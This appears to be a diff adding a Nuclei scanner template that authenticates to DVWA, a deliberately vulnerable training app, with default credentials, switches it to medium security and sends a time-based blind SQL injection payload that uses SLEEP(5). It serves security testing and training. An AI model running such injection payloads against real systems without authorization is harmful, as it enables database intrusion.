@@ -1,0 +1,88 @@
+id: dvwa-sqli-blind-medium-sec
+
+info:
+  name: DVWA SQLi blind - medium sec (Authenticated)
+  author: Dylan Shield (Shieldia.co)
+  severity: high
+  description: Attempts to exploit SQLi blind on DVWA after authentication.
+  reference:
+    - https://github.com/digininja/DVWA
+  tags: dvwa,sqli-blind
+
+variables:
+  password: "password"
+  username: "admin"
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  # Step 1: Authenticate as admin and get PHPSESSID and user_token
+  - raw:
+      - |
+        GET /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /DVWA/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        username={{username}}&password={{password}}&Login=Login&user_token={{token}}
+    
+    extractors:
+      - type: regex
+        name: token
+        group: 1
+        part: body
+        regex:
+          - "name='user_token' value='([a-f0-9]+)'"
+        internal: true
+
+  # Step 2: Set Security Level to medium
+  - raw:
+      - |
+        POST /DVWA/security.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Accept: */*
+        Connection: close
+
+        security=medium&seclev_submit=Submit&user_token={{token}}
+
+  # Step 3: Execute SQLi
+  - raw:
+      - |
+        POST /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1
+        Host: {{Hostname}}
+        Connection: keep-alive
+        Origin: http://tartarus-dvwa.home.arpa
+        Connection: keep-alive
+        Referer: http://tartarus-dvwa.home.arpa/DVWA/vulnerabilities/sqli/
+        Content-Type: application/x-www-form-urlencoded
+        
+        id=1+AND+SLEEP(5)%3B--+-&Submit=Submit
+
+    matchers:
+      - type: dsl
+        name: "Duration > 4 Seconds"
+        dsl:
+          - 'duration>=4'
+          - 'status_code == 200 || status_code == 404'
+        condition: and
+    
+    extractors:
+      - type: regex
+        name: query_in
+        part: request
+        group: 1
+        regex:
+          - "id=(.*)&"
+        internal: true
+      - type: dsl
+        name: query
+        dsl:
+          - "urldecode(query_in)"
